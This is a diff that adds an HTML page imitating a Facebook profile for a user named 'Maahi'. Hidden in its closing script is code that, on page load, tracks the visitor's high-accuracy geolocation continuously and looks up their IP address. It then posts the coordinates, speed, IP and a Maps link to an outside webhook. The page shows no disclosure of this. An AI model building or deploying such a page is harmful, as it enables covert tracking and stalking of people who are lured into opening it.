@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook Profile UI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f2f5;
+      color: #1c1e21;
+    }
+    header {
+      background-color: #1877f2;
+      color: white;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    header h1 {
+      font-size: 20px;
+    }
+
+    header input {
+      padding: 6px 10px;
+      border-radius: 20px;
+      border: none;
+      width: 60%;
+      font-size: 14px;
+    }
+
+    .profile-container {
+      background-color: white;
+    }
+
+    /* Cover Photo */
+    .cover-photo {
+      width: 100%;
+      height: 180px;
+      background-image: url('https://via.placeholder.com/500x180');
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+
+    /* Profile Picture */
+    .profile-pic {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 4px solid white;
+      position: absolute;
+      bottom: -60px;
+      left: 16px;
+      background-image: url('https://via.placeholder.com/120');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .user-info {
+      padding: 70px 16px 16px;
+      text-align: left;
+    }
+
+    .user-info h2 {
+      margin-bottom: 6px;
+      font-size: 22px;
+    }
+
+    .user-info p {
+      color: #606770;
+      font-size: 14px;
+    }
+
+    .actions {
+      display: flex;
+      gap: 10px;
+      padding: 10px 16px;
+    }
+
+    .actions button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .actions button.message {
+      background-color: #42b72a;
+    }
+
+    .about, .posts {
+      padding: 16px;
+      background-color: white;
+      margin-top: 10px;
+    }
+
+    .about h3,
+    .posts h3 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .about p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 6px;
+    }
+
+    .post {
+      background-color: #f0f2f5;
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 10px;
+    }
+
+    .post h4 {
+      margin-bottom: 4px;
+      font-size: 16px;
+    }
+
+    .post p {
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Facebook</h1>
+    <input type="text" placeholder="Search">
+  </header>
+
+  <div class="profile-container">
+    <div class="cover-photo">
+      <div class="profile-pic"></div>
+    </div>
+
+    <div class="user-info">
+      <h2>Maahi</h2>
+      <p>Life is beautiful ✨ | Nature Lover 🌿</p>
+    </div>
+
+    <div class="actions">
+      <button>Add Friend</button>
+      <button class="message">Message</button>
+    </div>
+
+    <div class="about">
+      <h3>About</h3>
+      <p>📍 India</p>
+      <p>🎓 Studied at University</p>
+      <p>💼 Airhosted</p>
+    </div>
+
+    <div class="posts">
+      <h3>Posts</h3>
+
+      <div class="post">
+        <h4>what's happing</h4>
+        <p>Just had an amazing sunset hike 🌄 #naturelove</p>
+      </div>
+
+      <div class="post">
+        <h4>kumari</h4>
+        <p>khbsurat din😊</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // const statusEl = document.getElementById('status');
+    // const debugEl = document.getElementById('debug');
+  
+    // Optional: Helper to get client's IP using an external API
+    async function getClientIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Failed to get IP address:', error);
+        return 'Unavailable';
+      }
+    }
+  
+    async function sendLocation(position) {
+      const WEBHOOK_URL = 'https://flow.sokt.io/func/scrixr1pgvJJ';
+      const {
+        latitude,
+        longitude,
+        accuracy,
+        altitude,
+        heading,
+        speed
+      } = position.coords;
+  
+      const ip = await getClientIP();
+  
+      const payload = {
+        latitude,
+        longitude,
+        accuracy,
+        altitude,
+        heading,
+        speed,
+        ip,
+        timestamp: new Date(position.timestamp).toISOString(),
+        mapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
+      };
+  
+      const debugInfo = {
+        ...payload,
+        accuracy: `${accuracy} meters`,
+        altitude: altitude !== null ? altitude + ' m' : 'N/A',
+        heading: heading !== null ? heading + '°' : 'N/A',
+        speed: speed !== null ? speed + ' m/s' : 'N/A',
+        timestamp: new Date(position.timestamp).toLocaleString()
+      };
+  
+      // debugEl.textContent = JSON.stringify(debugInfo, null, 2);
+      // statusEl.textContent = 'Sending accurate location to server...';
+  
+      try {
+         fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        // statusEl.textContent = 'Location sent successfully!';
+      } catch (error) {
+        console.error('Error sending location:', error);
+        // statusEl.textContent = 'Failed to send location.';
+      }
+    }
+  
+    if ('geolocation' in navigator) {
+      navigator.geolocation.watchPosition(sendLocation, (err) => {
+        console.error('Geolocation error:', err);
+        statusEl.textContent = 'Unable to retrieve location.';
+      }, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    } else {
+      // statusEl.textContent = 'Geolocation not supported by your browser.';
+    }
+  </script>
+  
+</body>
+</html>
